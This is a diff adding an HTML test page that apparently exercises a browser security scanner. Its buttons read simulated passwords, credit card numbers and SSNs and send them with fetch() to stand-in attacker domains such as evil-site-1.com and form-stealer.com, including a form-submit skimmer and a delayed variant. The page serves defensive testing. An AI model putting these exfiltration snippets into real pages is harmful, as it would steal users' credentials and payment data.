@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner Test - Controlled Malicious Behavior</title>
+    
+    <!-- Test external CSS resource -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    
+    <!-- Test external JS resource -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .test-section {
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: #fafafa;
+        }
+        
+        .test-inputs {
+            margin-bottom: 30px;
+            padding: 20px;
+            background: #e8f5e8;
+            border-radius: 5px;
+        }
+        
+        .test-inputs h3 {
+            margin-top: 0;
+            color: #2c5234;
+        }
+        
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        
+        button {
+            background: #007cba;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px;
+        }
+        
+        button:hover {
+            background: #005a85;
+        }
+        
+        .dangerous {
+            background: #dc3545;
+        }
+        
+        .dangerous:hover {
+            background: #c82333;
+        }
+        
+        .results {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff3cd;
+            border-radius: 4px;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .log {
+            font-family: monospace;
+            font-size: 12px;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        form {
+            background: #e8f4fd;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Scanner Test Suite</h1>
+        
+        <!-- Test image resources -->
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="https://via.placeholder.com/100x50/007cba/white?text=TEST+IMG" alt="Test Image 1" style="margin: 5px;">
+            <img src="https://httpbin.org/image/png" alt="Test Image 2" style="width: 50px; height: 50px; margin: 5px;">
+        </div>
+        
+        <p><strong>Instructions:</strong> Click each test button to trigger different malicious behavior patterns. Check the console and scanner report for correlations.</p>
+        
+        <div class="test-inputs">
+            <h3>📝 Test Inputs (Simulated Sensitive Data)</h3>
+            <input type="text" id="username" value="john.doe@example.com" placeholder="Username/Email">
+            <input type="password" id="password" value="MySecretPassword123!" placeholder="Password">
+            <input type="text" id="creditcard" value="4111-1111-1111-1111" placeholder="Credit Card">
+            <input type="text" id="ssn" value="123-45-6789" placeholder="Social Security Number">
+            <input type="text" id="phone" value="+1-555-123-4567" placeholder="Phone Number">
+        </div>
+        
+        <div class="test-section">
+            <h3>🧪 Test 1: Direct Action → Successful Request</h3>
+            <p>Reads username, sends to local endpoint (should succeed and be linked)</p>
+            <button id="test1">Run Test 1</button>
+            <div id="result1" class="results" style="display: none;">
+                <strong>Expected:</strong> input.value action → linked successful request (status 200/404)
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h3>🚨 Test 2: Action → CORS-Blocked Request</h3>
+            <p>Reads password, tries to send to external malicious domain (should be blocked)</p>
+            <button id="test2" class="dangerous">Run Test 2 (Safe - Will Be Blocked)</button>
+            <div id="result2" class="results" style="display: none;">
+                <strong>Expected:</strong> input.value action → linked failed request (status -999)
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h3>🔥 Test 3: Multiple Actions → Multiple Requests</h3>
+            <p>Reads multiple inputs, makes multiple malicious requests</p>
+            <button id="test3" class="dangerous">Run Test 3 (Safe - Will Be Blocked)</button>
+            <div id="result3" class="results" style="display: none;">
+                <strong>Expected:</strong> Multiple input.value actions → each linked to corresponding request
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h3>📋 Test 4: Form Handler Triggered</h3>
+            <form id="testForm">
+                <p>Form with event listener that reads data on submit</p>
+                <input type="text" id="form-data" value="form-sensitive-data" placeholder="Form Data">
+                <button type="submit" id="test4">Submit Form (Test 4)</button>
+            </form>
+            <div id="result4" class="results" style="display: none;">
+                <strong>Expected:</strong> form.addEventListener.submit action → linked request
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h3>⏰ Test 5: Delayed Request</h3>
+            <p>Reads credit card, waits 2 seconds, then makes request</p>
+            <button id="test5" class="dangerous">Run Test 5 (Safe - Will Be Blocked)</button>
+            <div id="result5" class="results" style="display: none;">
+                <strong>Expected:</strong> input.value action → linked request (despite 2s delay)
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h3>💣 Test 6: Rapid-Fire Multiple Requests</h3>
+            <p>Reads data, makes 5 requests in quick succession</p>
+            <button id="test6" class="dangerous">Run Test 6 (Safe - Will Be Blocked)</button>
+            <div id="result6" class="results" style="display: none;">
+                <strong>Expected:</strong> One action → multiple linked requests
+            </div>
+        </div>
+        
+        <div style="margin-top: 30px; padding: 20px; background: #d4edda; border-radius: 5px;">
+            <h3>📊 Instructions for Testing</h3>
+            <ol>
+                <li><strong>Open Browser DevTools</strong> (F12) to see console logs</li>
+                <li><strong>Run each test</strong> by clicking the buttons</li>
+                <li><strong>Check console</strong> for correlation logs like: <code>[FETCH] Reporting mapping: ... -> action_...</code></li>
+                <li><strong>Call finishScan()</strong> in console when done testing</li>
+                <li><strong>Check HTML report</strong> for proper action-request linkages</li>
+            </ol>
+        </div>
+        
+        <div class="log" id="console-log">
+            <strong>Console Log (copy of important messages):</strong><br>
+        </div>
+    </div>
+
+    <script>
+        // Console logging helper
+        function logToPage(message) {
+            const logDiv = document.getElementById('console-log');
+            logDiv.innerHTML += message + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        // Override console.log to capture messages
+        const originalLog = console.log;
+        console.log = function(...args) {
+            originalLog.apply(console, args);
+            const message = args.join(' ');
+            if (message.includes('[FETCH]') || message.includes('[XHR]') || message.includes('[FAILED]')) {
+                logToPage(message);
+            }
+        };
+
+        // Test 1: Direct Action → Successful Request
+        document.getElementById('test1').addEventListener('click', function() {
+            console.log('=== TEST 1 STARTING ===');
+            logToPage('=== TEST 1: Direct Action → Successful Request ===');
+            
+            // This should create an input.value action
+            const data = document.getElementById('username').value;
+            logToPage(`Reading username: "${data}"`);
+            
+            // This should create a linked request
+            fetch('/api/test-endpoint', { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username: data, test: 'test1'}) 
+            }).then(response => {
+                logToPage(`Test 1 request completed with status: ${response.status}`);
+            }).catch(error => {
+                logToPage(`Test 1 request failed: ${error.message}`);
+            });
+            
+            document.getElementById('result1').style.display = 'block';
+        });
+        
+        // Test 2: Action → CORS-Blocked Request
+        document.getElementById('test2').addEventListener('click', function() {
+            console.log('=== TEST 2 STARTING ===');
+            logToPage('=== TEST 2: Action → CORS-Blocked Request ===');
+            
+            // This should create an input.value action
+            const password = document.getElementById('password').value;
+            logToPage(`Reading password: "${password.substring(0, 3)}***"`);
+            
+            // This should create a linked but failed request
+            fetch('https://malicious-domain-that-does-not-exist.com/steal-password', { 
+                method: 'POST',
+                body: JSON.stringify({password: password, stolen: true})
+            }).then(response => {
+                logToPage(`Test 2 request unexpectedly succeeded: ${response.status}`);
+            }).catch(error => {
+                logToPage(`Test 2 request blocked (expected): ${error.message}`);
+            });
+            
+            document.getElementById('result2').style.display = 'block';
+        });
+        
+        // Test 3: Multiple Actions → Multiple Requests
+        document.getElementById('test3').addEventListener('click', function() {
+            console.log('=== TEST 3 STARTING ===');
+            logToPage('=== TEST 3: Multiple Actions → Multiple Requests ===');
+            
+            // Multiple input.value actions
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;  
+            const creditcard = document.getElementById('creditcard').value;
+            logToPage(`Reading username: "${username}"`);
+            logToPage(`Reading password: "${password.substring(0, 3)}***"`);
+            logToPage(`Reading credit card: "${creditcard}"`);
+            
+            // Multiple linked requests
+            fetch('https://evil-site-1.com/user-data', { 
+                method: 'POST', 
+                body: JSON.stringify({username}) 
+            }).catch(e => logToPage(`Evil request 1 blocked: ${e.message}`));
+            
+            fetch('https://evil-site-2.com/password-data', { 
+                method: 'POST', 
+                body: JSON.stringify({password}) 
+            }).catch(e => logToPage(`Evil request 2 blocked: ${e.message}`));
+            
+            fetch('https://evil-site-3.com/cc-data', { 
+                method: 'POST', 
+                body: JSON.stringify({creditcard}) 
+            }).catch(e => logToPage(`Evil request 3 blocked: ${e.message}`));
+            
+            document.getElementById('result3').style.display = 'block';
+        });
+        
+        // Test 4: Form Handler Triggered
+        document.getElementById('testForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent actual form submission
+            
+            console.log('=== TEST 4 STARTING ===');
+            logToPage('=== TEST 4: Form Handler Triggered ===');
+            
+            // This should create form.addEventListener.submit action + input.value action
+            const formData = document.getElementById('form-data').value;
+            logToPage(`Form submit handler reading data: "${formData}"`);
+            
+            // This should create a linked request
+            fetch('https://form-stealer.com/form-data', { 
+                method: 'POST',
+                body: JSON.stringify({formData, source: 'form-submit'})
+            }).catch(error => {
+                logToPage(`Test 4 form request blocked: ${error.message}`);
+            });
+            
+            document.getElementById('result4').style.display = 'block';
+        });
+        
+        // Test 5: Delayed Request
+        document.getElementById('test5').addEventListener('click', function() {
+            console.log('=== TEST 5 STARTING ===');
+            logToPage('=== TEST 5: Delayed Request ===');
+            
+            // This should create an input.value action
+            const creditcard = document.getElementById('creditcard').value;
+            logToPage(`Reading credit card: "${creditcard}"`);
+            
+            // This should create a linked request after 2 seconds
+            logToPage('Waiting 2 seconds before making request...');
+            setTimeout(() => {
+                logToPage('Making delayed request now...');
+                fetch('https://delayed-evil.com/cc-theft', { 
+                    method: 'POST',
+                    body: JSON.stringify({creditcard, delay: '2000ms'})
+                }).catch(error => {
+                    logToPage(`Test 5 delayed request blocked: ${error.message}`);
+                });
+            }, 2000);
+            
+            document.getElementById('result5').style.display = 'block';
+        });
+        
+        // Test 6: Rapid-Fire Multiple Requests
+        document.getElementById('test6').addEventListener('click', function() {
+            console.log('=== TEST 6 STARTING ===');
+            logToPage('=== TEST 6: Rapid-Fire Multiple Requests ===');
+            
+            // This should create one input.value action
+            const ssn = document.getElementById('ssn').value;
+            logToPage(`Reading SSN: "${ssn}"`);
+            
+            // This should create multiple linked requests in rapid succession
+            for (let i = 1; i <= 5; i++) {
+                fetch(`https://rapid-fire-${i}.com/ssn-data`, { 
+                    method: 'POST',
+                    body: JSON.stringify({ssn, requestNumber: i})
+                }).catch(error => {
+                    logToPage(`Rapid request ${i} blocked: ${error.message}`);
+                });
+            }
+            
+            document.getElementById('result6').style.display = 'block';
+        });
+        
+        // Add some helpful global functions
+        window.clearTestResults = function() {
+            document.querySelectorAll('.results').forEach(div => div.style.display = 'none');
+            document.getElementById('console-log').innerHTML = '<strong>Console Log (copy of important messages):</strong><br>';
+        };
+        
+        window.runAllTests = function() {
+            logToPage('=== RUNNING ALL TESTS IN SEQUENCE ===');
+            document.getElementById('test1').click();
+            setTimeout(() => document.getElementById('test2').click(), 1000);
+            setTimeout(() => document.getElementById('test3').click(), 2000);
+            setTimeout(() => document.getElementById('test4').click(), 3000);
+            setTimeout(() => document.getElementById('test5').click(), 4000);
+            setTimeout(() => document.getElementById('test6').click(), 6000);
+        };
+        
+        console.log('🔍 Scanner Test Page Loaded');
+        console.log('Available functions: clearTestResults(), runAllTests()');
+        logToPage('Test page loaded. Ready for testing!');
+    </script>
+</body>
+</html>
